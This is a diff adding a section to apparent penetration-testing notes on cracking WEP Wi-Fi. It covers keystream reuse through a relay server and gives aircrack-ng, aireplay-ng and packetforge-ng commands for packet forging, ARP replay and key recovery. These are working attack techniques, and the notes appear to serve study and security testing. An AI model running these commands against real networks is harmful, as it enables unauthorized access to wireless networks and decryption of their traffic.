@@ -162,3 +162,55 @@ aireplay-ng -5 -b <BSSID-Access-point> -h <client-MAC> <interface>
 
 ### Keystream reuse
 
+A successfully long keystream enables you to inject a specially crafted packet that is next relayed by an access point.  There is also a way to receive packets.  The attack consists of redirecting all incoming and encrypted packets to a server outside the wireless network and having an AP decrypt the redirected messages.  The packet will consist of two fragments, an IP of a buddy server and the original message.  Compose the first fragment using a known vector and a corresponding keystream (with more fragments flag set) the other fragment is sent in origina form without altering the IV, the unsuspecting AP decrypts both valid packets, combines them and relays to target.  The buddy server now only needs to send the decrypted messages to the attacker over unencrypted channel and has the capacity to now both inject and receive packets.
+
+Using packetforge-ng after generating keystream
+
+```sh
+packetforge-ng -0 -a <AP-BSSID> -h <client-MAC> -k <IP-ARP> -l <IP-ARP-router> -y <keystream-file> -w <output-file>
+```
+
+- -0 kind of packet ARP
+- -a Access Point MAC or BSSID
+- -h Client MAC
+- -k IP address of the ARP request
+- -l the IP of the computer which sends the request
+- -y the keystream filename
+- -w the output filename
+
+---
+
+Interactive packet replay and ARP request replay
+
+```sh
+aireplay-ng -2 -b <AP-BSSID> -t 1 -h <client-MAC> -c <Broadcast-MAC> -p 0841
+```
+
+- -2 parameter defines type of attack (interactive packet replay)
+- -b AP BSSID
+- -t boolean packets sent to AP?
+- -h Client MAC
+- -c Broadcast MAC (FF:FF:FF:FF:FF:FF)
+- -p Frame Control Field
+
+Sometimes this will not elicit the AP into responding so we cannot capture additional IVs, in which case we can try:
+
+```sh
+# attempts to capture ARP requests and replies to use for breaking network key
+aireplay-ng -3 -b <AP-BSSID> --h <client-MAC> <interface>
+```
+
+- -3 parameter to make the application only process ARP requests
+
+Using the capture ARP requests and responses file we can use aircrack-ng to determine the key (PTW)
+
+```sh
+aircrack-ng <packets.cap>
+# select the # of the network
+```
+
+You can alternatively use KoreK (need > 500,000 packets)
+
+```sh
+aircrack-ng -K <packets.cap>
+```
